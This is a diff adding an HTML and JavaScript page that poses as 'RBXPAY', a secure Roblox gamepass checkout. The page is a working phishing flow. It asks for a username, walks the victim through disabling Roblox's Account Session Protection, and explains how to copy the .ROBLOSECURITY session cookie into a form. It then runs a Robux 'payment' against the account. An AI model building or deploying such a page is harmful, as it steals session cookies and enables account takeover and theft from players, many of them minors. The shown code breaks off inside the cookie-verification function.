@@ -1,0 +1,1272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RBXPAY – Secure Payment</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #080812;
+      --card-bg: rgba(255,255,255,0.04);
+      --card-border: rgba(255,255,255,0.08);
+      --purple: #8b5cf6;
+      --purple-light: #a78bfa;
+      --purple-dark: #7c3aed;
+      --text: #f1f5f9;
+      --muted: #94a3b8;
+      --success: #22c55e;
+      --error: #ef4444;
+      --warning: #f59e0b;
+    }
+
+    html, body {
+      height: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      overflow-x: hidden;
+    }
+
+    canvas#stars {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .page-wrap {
+      position: relative;
+      z-index: 1;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 24px 16px 48px;
+    }
+
+    /* ── Navbar ── */
+    .navbar {
+      width: 100%;
+      max-width: 480px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 32px;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+    }
+
+
+    .logo-text {
+      font-size: 20px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      background: linear-gradient(135deg, var(--text), var(--purple-light));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+
+    /* ── Card ── */
+    .card {
+      width: 100%;
+      max-width: 480px;
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 24px;
+      padding: 40px 36px;
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(139,92,246,0.05);
+    }
+
+    /* ── Progress dots ── */
+    .progress-dots {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 32px;
+    }
+
+    .dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.15);
+      transition: all 0.3s ease;
+    }
+
+    .dot.active {
+      background: var(--purple);
+      box-shadow: 0 0 8px rgba(139,92,246,0.6);
+      width: 24px;
+      border-radius: 4px;
+    }
+
+    .dot.completed {
+      background: var(--success);
+    }
+
+    /* ── Steps ── */
+    .step {
+      display: none;
+      animation: fadeSlideIn 0.4s cubic-bezier(0.22, 0.61, 0.36, 1) forwards;
+    }
+
+    .step.active { display: block; }
+
+    @keyframes fadeSlideIn {
+      from { opacity: 0; transform: translateX(24px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+
+    @keyframes fadeSlideOut {
+      from { opacity: 1; transform: translateX(0); }
+      to   { opacity: 0; transform: translateX(-24px); }
+    }
+
+    /* ── Typography ── */
+    .step-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 8px;
+      line-height: 1.3;
+    }
+
+    .step-subtitle {
+      font-size: 14px;
+      color: var(--muted);
+      margin-bottom: 28px;
+      line-height: 1.6;
+    }
+
+    /* ── Input ── */
+    .input-group {
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--muted);
+      margin-bottom: 8px;
+      letter-spacing: 0.02em;
+      text-transform: uppercase;
+    }
+
+    .input-wrap {
+      position: relative;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 14px 16px;
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      font-size: 15px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    input[type="text"]:focus,
+    input[type="password"]:focus {
+      border-color: var(--purple);
+      box-shadow: 0 0 0 3px rgba(139,92,246,0.2);
+    }
+
+    input[type="text"]::placeholder,
+    input[type="password"]::placeholder {
+      color: rgba(148,163,184,0.5);
+    }
+
+    .eye-toggle {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      color: var(--muted);
+      cursor: pointer;
+      padding: 4px;
+      display: flex;
+      align-items: center;
+      transition: color 0.2s;
+    }
+
+    .eye-toggle:hover { color: var(--text); }
+
+    .input-has-eye input { padding-right: 44px; }
+
+    /* ── Buttons ── */
+    .btn {
+      width: 100%;
+      padding: 14px 24px;
+      border: none;
+      border-radius: 12px;
+      font-family: 'Inter', sans-serif;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.15s ease, filter 0.15s ease, box-shadow 0.15s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn:hover { transform: scale(1.02); filter: brightness(1.1); }
+    .btn:active { transform: scale(0.98); }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--purple), var(--purple-dark));
+      color: #fff;
+      box-shadow: 0 4px 20px rgba(139,92,246,0.4);
+    }
+
+    .btn-secondary {
+      background: rgba(255,255,255,0.06);
+      color: var(--text);
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+
+    .btn-success {
+      background: linear-gradient(135deg, #22c55e, #16a34a);
+      color: #fff;
+      box-shadow: 0 4px 20px rgba(34,197,94,0.3);
+    }
+
+    .btn-danger {
+      background: rgba(239,68,68,0.1);
+      color: var(--error);
+      border: 1px solid rgba(239,68,68,0.2);
+    }
+
+    .btn + .btn { margin-top: 10px; }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none !important;
+      filter: none !important;
+    }
+
+    /* ── Step 2: Avatar ── */
+    .avatar-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 28px;
+    }
+
+    .avatar-ring {
+      position: relative;
+      width: 130px; height: 130px;
+      margin-bottom: 16px;
+    }
+
+    .avatar-ring::before {
+      content: '';
+      position: absolute;
+      inset: -4px;
+      border-radius: 50%;
+      background: conic-gradient(from 0deg, var(--purple), var(--purple-light), var(--purple));
+      animation: spin 3s linear infinite;
+      z-index: 0;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .avatar-img {
+      position: relative;
+      z-index: 1;
+      width: 130px; height: 130px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 4px solid var(--bg);
+      background: rgba(255,255,255,0.05);
+    }
+
+    .avatar-glow {
+      position: absolute;
+      inset: -8px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(139,92,246,0.3), transparent 70%);
+      animation: pulse-glow 2s ease-in-out infinite;
+      z-index: -1;
+    }
+
+    @keyframes pulse-glow {
+      0%, 100% { opacity: 0.5; transform: scale(1); }
+      50% { opacity: 1; transform: scale(1.05); }
+    }
+
+    .display-name {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 4px;
+    }
+
+    .username-tag {
+      font-size: 14px;
+      color: var(--muted);
+    }
+
+    /* ── Step 3: Roblox Settings Mock ── */
+    .roblox-settings-mock {
+      background: #1a1a2e;
+      border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px;
+      overflow: hidden;
+      margin-bottom: 20px;
+      font-size: 13px;
+    }
+
+    .roblox-settings-header {
+      background: #111827;
+      padding: 10px 16px;
+      border-bottom: 1px solid rgba(255,255,255,0.07);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .roblox-dot {
+      width: 10px; height: 10px; border-radius: 50%;
+    }
+
+    .roblox-settings-body {
+      padding: 16px;
+    }
+
+    .settings-section-title {
+      font-size: 11px;
+      font-weight: 600;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      margin-bottom: 8px;
+    }
+
+    .settings-group-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 12px;
+    }
+
+    .settings-option {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      padding: 10px 12px;
+      border-radius: 8px;
+      margin-bottom: 6px;
+      border: 1px solid transparent;
+      cursor: default;
+    }
+
+    .settings-option.selected {
+      background: rgba(59, 130, 246, 0.1);
+      border-color: rgba(59, 130, 246, 0.3);
+    }
+
+    .settings-option-icon {
+      width: 30px; height: 30px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 15px;
+      flex-shrink: 0;
+    }
+
+    .settings-option-icon.normal { background: rgba(99,102,241,0.15); }
+    .settings-option-icon.none { background: rgba(239,68,68,0.15); }
+
+    .settings-option-content { flex: 1; }
+
+    .settings-option-name {
+      font-size: 13px;
+      font-weight: 500;
+      color: var(--text);
+      margin-bottom: 2px;
+    }
+
+    .settings-option-desc {
+      font-size: 11px;
+      color: var(--muted);
+    }
+
+    .settings-check {
+      width: 18px; height: 18px;
+      border-radius: 50%;
+      background: #3b82f6;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 6px;
+    }
+
+    .settings-warning {
+      background: rgba(245,158,11,0.1);
+      border: 1px solid rgba(245,158,11,0.2);
+      border-radius: 8px;
+      padding: 10px 12px;
+      margin-top: 10px;
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+      font-size: 11px;
+      color: #fbbf24;
+      line-height: 1.5;
+    }
+
+    /* ── Step 5: Payment Review ── */
+    .gamepass-preview {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .gamepass-icon {
+      width: 80px; height: 80px;
+      border-radius: 16px;
+      object-fit: cover;
+      margin-bottom: 14px;
+      background: rgba(139,92,246,0.1);
+      border: 1px solid rgba(139,92,246,0.2);
+    }
+
+    .gamepass-icon-fallback {
+      width: 80px; height: 80px;
+      border-radius: 16px;
+      background: linear-gradient(135deg, rgba(139,92,246,0.3), rgba(124,58,237,0.3));
+      border: 1px solid rgba(139,92,246,0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      margin-bottom: 14px;
+    }
+
+    .gamepass-name {
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--text);
+      text-align: center;
+      margin-bottom: 6px;
+    }
+
+    .gamepass-creator {
+      font-size: 13px;
+      color: var(--muted);
+      margin-bottom: 20px;
+    }
+
+    .price-display {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      background: rgba(139,92,246,0.1);
+      border: 1px solid rgba(139,92,246,0.2);
+      border-radius: 14px;
+      padding: 16px 24px;
+      margin-bottom: 24px;
+    }
+
+    .robux-icon {
+      width: 32px; height: 32px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #00b06f, #009060);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      font-size: 16px;
+      color: #fff;
+      flex-shrink: 0;
+    }
+
+    .price-amount {
+      font-size: 28px;
+      font-weight: 800;
+      color: var(--text);
+    }
+
+    .price-label {
+      font-size: 13px;
+      color: var(--muted);
+    }
+
+    .cancel-link {
+      display: block;
+      text-align: center;
+      margin-top: 14px;
+      color: var(--muted);
+      font-size: 13px;
+      cursor: pointer;
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+    .cancel-link:hover { color: var(--error); }
+
+    /* ── Step 6: Processing ── */
+    .processing-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 0;
+    }
+
+    .spinner {
+      width: 64px; height: 64px;
+      border: 3px solid rgba(139,92,246,0.15);
+      border-top-color: var(--purple);
+      border-radius: 50%;
+      animation: spin-fast 0.8s linear infinite;
+      margin-bottom: 24px;
+    }
+
+    @keyframes spin-fast {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ── Step 7: Success ── */
+    .success-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 16px 0;
+    }
+
+    .checkmark-circle {
+      width: 80px; height: 80px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--success), #16a34a);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+      animation: pop-in 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+      box-shadow: 0 0 30px rgba(34,197,94,0.4);
+    }
+
+    @keyframes pop-in {
+      from { transform: scale(0); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+
+    .checkmark-svg {
+      width: 36px; height: 36px;
+    }
+
+    .success-title {
+      font-size: 24px;
+      font-weight: 800;
+      color: var(--text);
+      margin-bottom: 8px;
+    }
+
+    .success-sub {
+      font-size: 14px;
+      color: var(--muted);
+      text-align: center;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    /* ── Alerts ── */
+    .alert {
+      border-radius: 10px;
+      padding: 12px 14px;
+      font-size: 13px;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      line-height: 1.5;
+    }
+
+    .alert-error {
+      background: rgba(239,68,68,0.08);
+      border: 1px solid rgba(239,68,68,0.2);
+      color: #fca5a5;
+    }
+
+    .alert-warning {
+      background: rgba(245,158,11,0.08);
+      border: 1px solid rgba(245,158,11,0.2);
+      color: #fcd34d;
+    }
+
+    .alert-info {
+      background: rgba(59,130,246,0.08);
+      border: 1px solid rgba(59,130,246,0.2);
+      color: #93c5fd;
+    }
+
+    .hint-box {
+      background: rgba(255,255,255,0.03);
+      border: 1px solid rgba(255,255,255,0.06);
+      border-radius: 10px;
+      padding: 12px 14px;
+      font-size: 13px;
+      color: var(--muted);
+      margin-bottom: 20px;
+      line-height: 1.6;
+    }
+
+    .hint-box code {
+      background: rgba(255,255,255,0.07);
+      border-radius: 4px;
+      padding: 1px 5px;
+      font-size: 12px;
+      color: var(--purple-light);
+    }
+
+    /* ── Link button ── */
+    .btn-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--purple-light);
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      transition: color 0.2s;
+      padding: 12px 0;
+    }
+    .btn-link:hover { color: var(--text); }
+
+    /* ── Confetti canvas ── */
+    #confetti-canvas {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 10;
+    }
+
+    /* ── Divider ── */
+    .divider {
+      height: 1px;
+      background: rgba(255,255,255,0.06);
+      margin: 20px 0;
+    }
+
+    @media (max-width: 520px) {
+      .card { padding: 28px 20px; border-radius: 16px; }
+      .step-title { font-size: 19px; }
+    }
+  </style>
+</head>
+<body>
+  <canvas id="stars"></canvas>
+  <canvas id="confetti-canvas"></canvas>
+
+  <div class="page-wrap">
+    <nav class="navbar">
+      <a class="logo" href="/">
+        <span class="logo-text">RBXPAY</span>
+      </a>
+    </nav>
+
+    <div class="card">
+      <!-- Progress dots -->
+      <div class="progress-dots" id="progressDots"></div>
+
+      <!-- Step 1: Username -->
+      <div class="step active" id="step1">
+        <div class="step-title">Enter your Roblox username</div>
+        <div class="step-subtitle">We'll verify your account to process the payment securely.</div>
+        <div id="step1Error"></div>
+        <div class="input-group">
+          <label>Roblox Username</label>
+          <input type="text" id="usernameInput" placeholder="YourUsername123" autocomplete="off" />
+        </div>
+        <button class="btn btn-primary" id="btnContinueUsername" onclick="verifyUsername()">
+          Continue →
+        </button>
+      </div>
+
+      <!-- Step 2: Confirm identity -->
+      <div class="step" id="step2">
+        <div class="step-title">Is this you?</div>
+        <div class="step-subtitle">Please confirm your Roblox account before continuing.</div>
+        <div class="avatar-wrap">
+          <div class="avatar-ring">
+            <div class="avatar-glow"></div>
+            <img class="avatar-img" id="avatarImg" src="" alt="Avatar" />
+          </div>
+          <div class="display-name" id="displayName"></div>
+          <div class="username-tag" id="usernameTag"></div>
+        </div>
+        <button class="btn btn-success" onclick="confirmIdentity()">✓ Yes, that's me!</button>
+        <button class="btn btn-secondary" onclick="goToStep(1)">✕ No, wrong account</button>
+      </div>
+
+      <!-- Step 3: Disable session protection -->
+      <div class="step" id="step3">
+        <div class="step-title">Disable Account Session Protection</div>
+        <div class="step-subtitle">To authenticate, you need to disable Account Session Protection in Roblox settings.</div>
+
+        <div class="roblox-settings-mock">
+          <div class="roblox-settings-header">
+            <div class="roblox-dot" style="background:#ff5f57"></div>
+            <div class="roblox-dot" style="background:#febc2e"></div>
+            <div class="roblox-dot" style="background:#28c840"></div>
+            <span style="font-size:11px;color:#6b7280;margin-left:8px;">Roblox Creator Hub – Advanced Settings</span>
+          </div>
+          <div class="roblox-settings-body">
+            <div class="settings-section-title">Advanced</div>
+            <div class="settings-group-title">Account Session Protection</div>
+
+            <div class="settings-option">
+              <div class="settings-option-icon normal">🛡️</div>
+              <div class="settings-option-content">
+                <div class="settings-option-name">Standard Protection</div>
+                <div class="settings-option-desc">Recommended for most users. Session cookies are secured.</div>
+              </div>
+            </div>
+
+            <div class="settings-option selected">
+              <div class="settings-option-icon none">🚫</div>
+              <div class="settings-option-content">
+                <div class="settings-option-name">No protection <span style="color:#6b7280;font-size:11px;">(not recommended)</span></div>
+                <div class="settings-option-desc">Disable session protection. Required for some tools.</div>
+              </div>
+              <div class="settings-check">
+                <svg width="10" height="8" viewBox="0 0 10 8" fill="none">
+                  <path d="M1 4L3.5 6.5L9 1" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </div>
+            </div>
+
+            <div class="settings-warning">
+              <span>⚠️</span>
+              <span>Warning: You are turning off this security protection at your own risk. If your account is compromised as a result of turning off Account Session Protection, Roblox won't be able to assist you.</span>
+            </div>
+          </div>
+        </div>
+
+        <a href="https://create.roblox.com/settings/advanced" target="_blank" class="btn btn-secondary" style="margin-bottom:10px;text-decoration:none;display:flex;align-items:center;justify-content:center;gap:8px;">
+          Open Roblox Security Settings &nbsp;→
+        </a>
+        <button class="btn btn-primary" onclick="goToStep(4)">I've disabled it, continue →</button>
+      </div>
+
+      <!-- Step 4: Enter cookie -->
+      <div class="step" id="step4">
+        <div class="step-title">Authenticate with Cookie</div>
+        <div class="step-subtitle">Enter your <code style="background:rgba(255,255,255,0.07);padding:2px 6px;border-radius:4px;color:var(--purple-light);">.ROBLOSECURITY</code> cookie to verify your identity.</div>
+
+        <div class="hint-box">
+          <strong style="color:var(--text);">How to find your cookie:</strong><br />
+          1. Open Roblox in your browser<br />
+          2. Press <code>F12</code> to open DevTools<br />
+          3. Go to <code>Application</code> → <code>Cookies</code> → <code>roblox.com</code><br />
+          4. Find <code>.ROBLOSECURITY</code> and copy the full value
+        </div>
+
+        <div id="step4Error"></div>
+
+        <div class="input-group">
+          <label>.ROBLOSECURITY Cookie</label>
+          <div class="input-wrap input-has-eye">
+            <input type="password" id="cookieInput" placeholder="Paste your cookie here..." autocomplete="off" />
+            <button class="eye-toggle" onclick="toggleCookieVisibility()">
+              <svg id="eyeIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                <circle cx="12" cy="12" r="3"/>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <button class="btn btn-primary" id="btnVerifyCookie" onclick="verifyCookie()">
+          Verify &amp; Continue →
+        </button>
+        <button class="btn btn-secondary" onclick="goToStep(3)" style="margin-top:8px;">← Back</button>
+      </div>
+
+      <!-- Step 5: Payment review -->
+      <div class="step" id="step5">
+        <div class="step-title">Confirm Payment</div>
+        <div class="step-subtitle">Review the details before completing your purchase.</div>
+
+        <div class="gamepass-preview">
+          <div id="gpIconWrap"></div>
+          <div class="gamepass-name" id="gpName"></div>
+          <div class="gamepass-creator" id="gpCreator"></div>
+          <div class="price-display">
+            <div class="robux-icon">R$</div>
+            <div>
+              <div class="price-amount" id="gpPrice"></div>
+              <div class="price-label">Robux</div>
+            </div>
+          </div>
+        </div>
+
+        <div id="step5Error"></div>
+        <button class="btn btn-primary" id="btnConfirmPay" onclick="executePayment()">Confirm Payment →</button>
+        <a class="cancel-link" onclick="cancelPayment()">Cancel</a>
+      </div>
+
+      <!-- Step 6: Processing -->
+      <div class="step" id="step6">
+        <div class="processing-wrap">
+          <div class="spinner"></div>
+          <div class="step-title" style="text-align:center;">Processing your payment…</div>
+          <div class="step-subtitle" style="text-align:center;margin-bottom:0;">This may take a few seconds. Please don't close this page.</div>
+        </div>
+      </div>
+
+      <!-- Step 7: Success -->
+      <div class="step" id="step7">
+        <div class="success-wrap">
+          <div class="checkmark-circle">
+            <svg class="checkmark-svg" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5">
+              <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="success-title">Payment Successful!</div>
+          <div class="success-sub" id="successSub"></div>
+          <button class="btn btn-success" id="returnBtn" onclick="returnToMerchant()" style="display:none;">Return to Store →</button>
+        </div>
+      </div>
+
+    </div><!-- /card -->
+  </div><!-- /page-wrap -->
+
+<script>
+// ─── Stars ────────────────────────────────────────────────────────────────────
+(function() {
+  const canvas = document.getElementById('stars');
+  const ctx = canvas.getContext('2d');
+  const stars = [];
+
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+
+  function initStars() {
+    stars.length = 0;
+    for (let i = 0; i < 200; i++) {
+      stars.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        r: Math.random() * 1.2 + 0.2,
+        vx: (Math.random() - 0.5) * 0.15,
+        vy: (Math.random() - 0.5) * 0.15,
+        alpha: Math.random() * 0.6 + 0.2
+      });
+    }
+  }
+
+  function tick() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    for (const s of stars) {
+      s.x += s.vx;
+      s.y += s.vy;
+      if (s.x < 0) s.x = canvas.width;
+      if (s.x > canvas.width) s.x = 0;
+      if (s.y < 0) s.y = canvas.height;
+      if (s.y > canvas.height) s.y = 0;
+      ctx.beginPath();
+      ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(255,255,255,${s.alpha})`;
+      ctx.fill();
+    }
+    requestAnimationFrame(tick);
+  }
+
+  window.addEventListener('resize', () => { resize(); initStars(); });
+  resize();
+  initStars();
+  tick();
+})();
+
+// ─── Confetti ─────────────────────────────────────────────────────────────────
+function launchConfetti() {
+  const canvas = document.getElementById('confetti-canvas');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  const pieces = [];
+  const colors = ['#8b5cf6','#a78bfa','#22c55e','#f59e0b','#ef4444','#3b82f6','#ec4899'];
+
+  for (let i = 0; i < 120; i++) {
+    pieces.push({
+      x: Math.random() * canvas.width,
+      y: -10 - Math.random() * 100,
+      w: 6 + Math.random() * 8,
+      h: 4 + Math.random() * 6,
+      vx: (Math.random() - 0.5) * 3,
+      vy: 2 + Math.random() * 4,
+      rot: Math.random() * Math.PI * 2,
+      vrot: (Math.random() - 0.5) * 0.15,
+      color: colors[Math.floor(Math.random() * colors.length)],
+      alpha: 1
+    });
+  }
+
+  let frame = 0;
+  function draw() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    let alive = false;
+    for (const p of pieces) {
+      if (p.alpha <= 0) continue;
+      alive = true;
+      p.x += p.vx;
+      p.y += p.vy;
+      p.rot += p.vrot;
+      if (p.y > canvas.height * 0.7) p.alpha -= 0.018;
+      ctx.save();
+      ctx.globalAlpha = Math.max(0, p.alpha);
+      ctx.translate(p.x, p.y);
+      ctx.rotate(p.rot);
+      ctx.fillStyle = p.color;
+      ctx.fillRect(-p.w / 2, -p.h / 2, p.w, p.h);
+      ctx.restore();
+    }
+    if (alive) requestAnimationFrame(draw);
+    else ctx.clearRect(0, 0, canvas.width, canvas.height);
+  }
+  draw();
+}
+
+// ─── State ────────────────────────────────────────────────────────────────────
+const TOTAL_STEPS = 7;
+let currentStep = 1;
+let state = {
+  paymentId: null,
+  payment: null,
+  userId: null,
+  username: null,
+  displayName: null,
+  cookieVisible: false
+};
+
+// ─── Init ─────────────────────────────────────────────────────────────────────
+(async function init() {
+  // Build progress dots
+  const dotsEl = document.getElementById('progressDots');
+  for (let i = 1; i <= TOTAL_STEPS; i++) {
+    const d = document.createElement('div');
+    d.className = 'dot' + (i === 1 ? ' active' : '');
+    d.id = 'dot' + i;
+    dotsEl.appendChild(d);
+  }
+
+  // Get paymentId from URL
+  const pathParts = window.location.pathname.split('/');
+  state.paymentId = pathParts[pathParts.length - 1];
+
+  // Load payment info
+  if (state.paymentId) {
+    try {
+      const resp = await fetch(`/api/payments/${state.paymentId}`);
+      if (resp.ok) {
+        state.payment = await resp.json();
+        renderPaymentStep();
+      } else {
+        showGlobalError('Payment not found or expired.');
+      }
+    } catch {
+      showGlobalError('Failed to load payment info.');
+    }
+  }
+
+  // Enter key on username input
+  document.getElementById('usernameInput').addEventListener('keydown', e => {
+    if (e.key === 'Enter') verifyUsername();
+  });
+})();
+
+function showGlobalError(msg) {
+  document.querySelector('.card').innerHTML = `
+    <div style="text-align:center;padding:20px 0;">
+      <div style="font-size:40px;margin-bottom:16px;">⚠️</div>
+      <div class="step-title" style="margin-bottom:8px;">Error</div>
+      <div class="step-subtitle">${msg}</div>
+    </div>`;
+}
+
+function renderPaymentStep() {
+  if (!state.payment) return;
+  const p = state.payment;
+
+  // Icon
+  const gpIconWrap = document.getElementById('gpIconWrap');
+  if (p.gampassIcon) {
+    gpIconWrap.innerHTML = `<img class="gamepass-icon" src="${p.gampassIcon}" alt="Gamepass icon" onerror="this.outerHTML='<div class=gamepass-icon-fallback>🎮</div>'" />`;
+  } else {
+    gpIconWrap.innerHTML = `<div class="gamepass-icon-fallback">🎮</div>`;
+  }
+
+  document.getElementById('gpName').textContent = p.gampassName || 'Unknown Gamepass';
+  document.getElementById('gpCreator').textContent = p.creatorName ? `by ${p.creatorName}` : '';
+  document.getElementById('gpPrice').textContent = (p.price || 0).toLocaleString();
+}
+
+// ─── Step navigation ──────────────────────────────────────────────────────────
+function goToStep(n) {
+  const old = document.getElementById('step' + currentStep);
+  old.classList.remove('active');
+
+  // Update dots
+  for (let i = 1; i <= TOTAL_STEPS; i++) {
+    const d = document.getElementById('dot' + i);
+    if (!d) continue;
+    d.className = 'dot';
+    if (i < n) d.classList.add('completed');
+    else if (i === n) d.classList.add('active');
+  }
+
+  currentStep = n;
+  const next = document.getElementById('step' + n);
+  next.classList.add('active');
+}
+
+// ─── Step 1: Verify username ──────────────────────────────────────────────────
+async function verifyUsername() {
+  const username = document.getElementById('usernameInput').value.trim();
+  const errEl = document.getElementById('step1Error');
+  errEl.innerHTML = '';
+
+  if (!username) {
+    errEl.innerHTML = `<div class="alert alert-error">⚠️ Please enter your Roblox username.</div>`;
+    return;
+  }
+
+  const btn = document.getElementById('btnContinueUsername');
+  btn.disabled = true;
+  btn.textContent = 'Looking up…';
+
+  try {
+    const resp = await fetch('/api/verify-username', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username })
+    });
+    const data = await resp.json();
+
+    if (!resp.ok) {
+      errEl.innerHTML = `<div class="alert alert-error">⚠️ ${data.error || 'User not found.'}</div>`;
+      return;
+    }
+
+    state.userId = data.userId;
+    state.username = data.username;
+    state.displayName = data.displayName;
+
+    document.getElementById('avatarImg').src = data.thumbnail || '';
+    document.getElementById('displayName').textContent = data.displayName;
+    document.getElementById('usernameTag').textContent = '@' + data.username;
+
+    goToStep(2);
+  } catch {
+    errEl.innerHTML = `<div class="alert alert-error">⚠️ Network error. Please try again.</div>`;
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Continue →';
+  }
+}
+
+// ─── Step 2: Confirm identity ─────────────────────────────────────────────────
+async function confirmIdentity() {
+  try {
+    const resp = await fetch('/api/check-session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ userId: state.userId, paymentId: state.paymentId })
+    });
+    const data = await resp.json();
+
+    if (data.hasSession) {
+      // Skip to payment review
+      renderPaymentStep();
+      goToStep(5);
+    } else {
+      goToStep(3);
+    }
+  } catch {
+    goToStep(3);
+  }
+}
+
+// ─── Step 4: Toggle cookie visibility ────────────────────────────────────────
+function toggleCookieVisibility() {
+  const input = document.getElementById('cookieInput');
+  state.cookieVisible = !state.cookieVisible;
+  input.type = state.cookieVisible ? 'text' : 'password';
+  document.getElementById('eyeIcon').innerHTML = state.cookieVisible
+    ? `<path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
+       <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
+       <line x1="1" y1="1" x2="23" y2="23" stroke-linecap="round"/>`
+    : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
+}
+
+// ─── Step 4: Verify cookie ────────────────────────────────────────────────────
+async function verifyCookie() {
+  const cookie = document.getElementById('cookieInput').value.trim();
+  const errEl = document.getElementById('step4Error');
+  errEl.innerHTML = '';
+
+  if (!cookie) {
+    errEl.innerHTML = `<div class="alert alert-error">⚠️ Please paste your .ROBLOSECURITY cookie.</div>`;
+    return;
+  }
+
+  const btn = document.getElementById('btnVerifyCookie');
